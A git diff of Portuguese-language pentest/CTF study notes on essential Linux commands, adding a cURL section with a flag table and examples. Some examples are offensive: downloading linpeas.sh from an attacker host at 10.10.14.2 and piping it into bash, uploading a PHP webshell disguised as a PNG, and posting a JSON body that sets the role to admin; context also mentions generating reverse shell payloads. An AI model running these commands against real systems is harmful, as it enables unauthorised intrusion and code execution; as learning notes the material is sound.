@@ -1,4 +1,4 @@
-	# 🐧 Linux — Comandos Essenciais
+ 🐧 Linux — Comandos Essenciais
 
 > [!Fonte de onde pego os ensinamentos e dicas]
 > https://notebooklm.google.com/notebook/556e39f1-065f-4755-b85c-d3ae7090b385
@@ -91,7 +91,7 @@ Essencial para ler configurações ou encontrar informações em textos longos.
 | `ip route` | Tabela de roteamento | Identificar o gateway |
 | `netstat -tulnp` | Portas abertas e serviços escutando | Encontrar serviços internos |
 | `ss -tulnp` | Alternativa moderna ao netstat | Mesmo uso |
-| `curl` / `wget` | Baixar arquivos ou fazer requisições HTTP | Transferir ferramentas para o alvo |
+| `curl` / `wget` | Transferência de arquivos e requisições HTTP | Ver seção dedicada: [[#10. 🌐 cURL — Canivete Suíço HTTP]] |
 
 ---
 
@@ -223,3 +223,78 @@ penelope -c ALVO_IP -p PORTA
 | `exit` | Sai da Penelope |
 
 > **Dica:** Use `penelope -a` quando já estiver no listener — ele gera e mostra os payloads de reverse shell prontos para copiar e colar no alvo!
+
+---
+
+## 10. 🌐 cURL — Canivete Suíço HTTP e Transferência
+
+> **O que é:** Ferramenta de linha de comando para transferência de dados utilizando múltiplos protocolos (HTTP, HTTPS, FTP, FTPS, SFTP, etc.). Em pentest e CTF, funciona como um navegador sem interface gráfica para interagir diretamente com APIs, debugar cabeçalhos, testar injeções e transferir arquivos para o alvo.
+
+### 10.1 Tabela de Flags Essenciais
+
+| Flag (Curta) | Flag (Longa) | Função | Exemplo de Aplicação |
+|---|---|---|---|
+| `-I` | `--head` | Retorna apenas os cabeçalhos de resposta (HEAD request) | Banner grabbing rápido de web servers |
+| `-i` | `--include` | Inclui cabeçalhos HTTP junto com o corpo da resposta | Análise de cookies (`Set-Cookie`) e status codes |
+| `-v` | `--verbose` | Modo verboso: exibe o handshake TLS, request e response | Diagnóstico de conexão e depuração profunda |
+| `-s` | `--silent` | Modo silencioso (oculta barra de progresso e erros) | Uso em pipelines e scripts bash (`grep`, `jq`) |
+| `-o <arq>` | `--output <arq>` | Salva a resposta no arquivo especificado | Download direto com controle de nome |
+| `-O` | `--remote-name` | Salva o arquivo preservando o nome original da URL | Download rápido de exploits/scripts |
+| `-X <MÉT>` | `--request <MÉT>` | Especifica o método HTTP (`GET`, `POST`, `PUT`, `DELETE`) | Interação com rotas de API |
+| `-d <dado>`| `--data <dado>` | Envia dados no body (POST por padrão com `form-urlencoded`) | Submissão de parâmetros ou JSON |
+| `-H <cab>` | `--header <cab>` | Adiciona um cabeçalho HTTP personalizado | Injeção de `Authorization: Bearer`, `Content-Type` |
+| `-L` | `--location` | Segue redirecionamentos automáticos (`301`, `302`, `307`) | Evita parar em páginas de redirect |
+| `-k` | `--insecure` | Permite conexões TLS/SSL com certificados inválidos/autoassinados | CTFs e ambientes internos sem certificado válido |
+| `-x <prx>` | `--proxy <prx>` | Roteia o tráfego através de um proxy HTTP/SOCKS | Envio direto para o Burp Suite (`http://127.0.0.1:8080`) |
+| `-u <u:s>` | `--user <u:s>` | Autenticação HTTP Basic ou Digest (`usuario:senha`) | Acesso a painéis protegidos por `.htaccess` |
+| `-b <ck>`  | `--cookie <ck>` | Envia cookies no request (string direta ou arquivo) | Sessão autenticada (`PHPSESSID=...`) |
+| `-c <arq>` | `--cookie-jar <arq>` | Salva os cookies recebidos da resposta em um arquivo | Persistência de sessão pós-login |
+| `-F <f=v>` | `--form <f=v>` | Envia dados como `multipart/form-data` | Upload de arquivos e WebShells |
+
+---
+
+### 10.2 Modos de Uso Práticos
+
+#### 1. Reconhecimento Rápido e Análise de Headers
+```bash
+# Obter apenas os cabeçalhos (Status Code, Server, X-Powered-By)
+curl -I https://alvo.com
+
+# Seguir redirects silenciosamente e retornar apenas o HTTP Status Code final
+curl -s -L -o /dev/null -w "%{http_code}\n" https://alvo.com
+```
+
+#### 2. Interação com APIs REST e GraphQL
+```bash
+# Requisição POST enviando JSON autenticado via Bearer Token
+curl -s -X POST "https://alvo.com/api/v1/profile" \
+  -H "Authorization: Bearer SEU_JWT_TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"role":"admin","debug":true}'
+```
+
+#### 3. Rotear Tráfego para o Burp Suite
+```bash
+# Enviar requisição direta para o Burp Suite local (porta padrão 8080) com bypass SSL
+curl -k -x http://127.0.0.1:8080 https://alvo.com/login
+```
+
+#### 4. Transferência de Arquivos no Alvo (Post-Exploitation)
+```bash
+# No host comprometido: baixar ferramenta da máquina atacante e salvar em /tmp
+curl -s http://10.10.14.2:8000/linpeas.sh -o /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh
+
+# Execução direta na memória via pipe (sem tocar o disco)
+curl -s http://10.10.14.2:8000/linpeas.sh | bash
+```
+
+#### 5. Upload de Arquivos / Multipart Form Data
+```bash
+# Simular upload de arquivo (o '@' indica caminho local do arquivo)
+curl -X POST "https://alvo.com/upload" \
+  -H "Cookie: PHPSESSID=session_ativa" \
+  -F "avatar=@/tmp/shell.php;type=image/png" \
+  -F "submit=Upload"
+```
+
+> **Relacionado:** [[Process of Hacking]] (Reconhecimento) • [[OWASP API Top 10]] (Testes de endpoints de API) • [[Linux Privilege Escalation]] (Transferência de enum scripts)
